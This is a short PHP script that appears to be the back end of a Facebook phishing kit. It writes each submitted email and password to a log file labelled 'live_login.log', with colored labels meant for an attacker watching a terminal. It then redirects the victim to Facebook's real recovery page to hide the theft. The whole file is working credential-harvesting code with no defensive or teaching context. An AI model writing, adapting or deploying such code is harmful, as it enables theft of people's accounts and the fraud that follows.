<?php 
$BRIGHT_GREEN = "\033[1;92m";
$BRIGHT_CYAN = "\033[1;96m";
$BRIGHT_YELLOW = "\033[1;93m";
$RESET = "\033[0m";

file_put_contents("live_login.log", 
    "{$BRIGHT_CYAN}Facebook {$BRIGHT_YELLOW}Username: {$BRIGHT_GREEN}" . $_POST['email'] . 
    " {$BRIGHT_YELLOW}Pass: {$BRIGHT_GREEN}" . $_POST['pass'] . "{$RESET}\n", 
    FILE_APPEND
);

header('Location: https://facebook.com/recover/initiate/');
exit();
?>